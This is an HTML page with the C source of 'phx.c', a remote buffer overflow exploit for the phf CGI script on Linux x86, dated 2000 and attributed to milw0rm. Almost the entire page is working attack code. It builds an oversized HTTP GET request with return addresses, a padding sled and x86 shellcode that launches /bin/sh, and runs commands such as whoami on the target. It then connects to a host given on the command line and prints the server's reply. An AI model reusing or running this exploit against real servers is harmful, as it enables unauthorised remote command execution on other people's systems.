<html><head><title>phf buffer overflow exploit for Linux-x86</title></head><pre>/*
 |  phx.c -- phf buffer overflow exploit for Linux-ix86
 |  Copyright (c) 2000 by proton. All rights reserved.
 |
 |  This program is free software; you can redistribute it and/or modify
 |  it under the terms of the GNU General Public License as published by
 |  the Free Software Foundation; either version 2 of the License, or
 |  (at your option) any later version.
 |
 |  This program is distributed in the hope that it will be useful,
 |  but WITHOUT ANY WARRANTY; without even the implied warranty of
 |  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 |  GNU General Public License for more details.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;

char    tmp[8192];
char    *host;
char    *progname;

#define output(x) write(1,x,sizeof(x))

unsigned char shellcode[] =
  &quot;GET /cgi-bin/phf?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&quot;
  /*
   *  2 pointers, in case of -fomit-frame-pointer
   */
  &quot;\x37\xfc\xff\xbf&quot;
  &quot;\x37\xfc\xff\xbf&quot;
  &quot; HTTP/1.0\n&quot;
  /*
   *  set environment var `HTTP_X'
   */
  &quot;X: &quot;
  /*
   *  a bundle of AAA's, they're just as good as NOP's
   *  but is a tad bit more readable to humans.
   *  512 no-op instructions gives us a nice phat
   *  strike-zone for the above 2 pointers.
   */
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  &quot;7777777777777777777777777777777777777777777777777777777777777777&quot;
  /*
   *  exploit code
   */
  &quot;\xeb\x3b\x5e\x8d\x5e\x10\x89\x1e\x8d\x7e\x18\x89\x7e\x04\x8d\x7e\x1b\x89\x7e\x08&quot;
  &quot;\xb8\x40\x40\x40\x40\x47\x8a\x07\x28\xe0\x75\xf9\x31\xc0\x88\x07\x89\x46\x0c\x88&quot;
  &quot;\x46\x17\x88\x46\x1a\x89\xf1\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
  &quot;\x80\xe8\xc0\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
  &quot;\x41\x41&quot;
  /*
   *  try to make sense to the webserver
   */
  &quot;/bin/sh -c echo 'Content-Type: text/plain';echo '';&quot;
  /*
   *  execute something funny!
   */
  &quot;echo Hello! I am running as \\\&quot;`whoami`\\\&quot; on a `arch` cpu;&quot;
  &quot;echo Local time is `date` and there are `who|wc -l` users logged in.;&quot;
  &quot;echo '';&quot;
  /*
   *  shellcode will terminate command at the `@'
   */
  &quot;@\n\n&quot;
  ;

void netpipe(int *rsock, int *wsock)
{
  struct  sockaddr_in sai;
  struct  hostent *he;
  int     s;

  if (!host || !*host)
  {
    printf(&quot;Usage: %s &lt;host&gt;\n&quot;,progname);
    exit(1);
  }
  he = gethostbyname(host);
  if (!he)
  {
    printf(&quot;%s: Unknown host\n&quot;,host);
    exit(1);
  }

  s = socket(AF_INET,SOCK_STREAM,0);
  sai.sin_family = AF_INET;
  sai.sin_port = htons(80);
  memcpy(&amp;sai.sin_addr,he-&gt;h_addr_list[0],sizeof(struct in_addr));

  if (connect(s,(struct sockaddr*)&amp;sai,sizeof(sai)) &lt; 0)
  {
    switch(errno)
    {
    case ECONNREFUSED:
      output(&quot;Connection refused.\n&quot;);
      break;
    case ETIMEDOUT:
      output(&quot;Connection timed out.\n&quot;);
      break;
    case ENETUNREACH:
      output(&quot;Network unreachable.\n&quot;);
      break;
    default:
      output(&quot;Unknown error.\n&quot;);
      break;
    }
    exit(1);
  }
  *rsock = *wsock = s;
}

int main(int argc, char **argv)
{
  char    *q,*cp;
  int     in,out;
  int     sz,x,n;

  progname = argv[0];
  host = argv[1];

  netpipe(&amp;in,&amp;out);
  write(out,shellcode,sizeof(shellcode));
  output(&quot;\nCome to papa!\n\n&quot;);

  n = x = 0;
  for(;;)
  {
    sz = read(in,&amp;tmp[x],512-x);
    if (sz &lt; 1)
      break;
    x += sz;
    q = cp = tmp;
    for(sz=x;sz;)
    {
      if (*q == '\n')
      {
        write(1,cp,(q-cp)+1);
        cp = q + 1;
      }
      q++;
      sz--;
    }
    if (cp != tmp)
    {
      sz = x - (cp - tmp);
      memcpy(tmp,cp,sz);
      x -= (cp - tmp);
    }
  }
  exit(0);
}


// milw0rm.com [2000-12-01]</pre></html>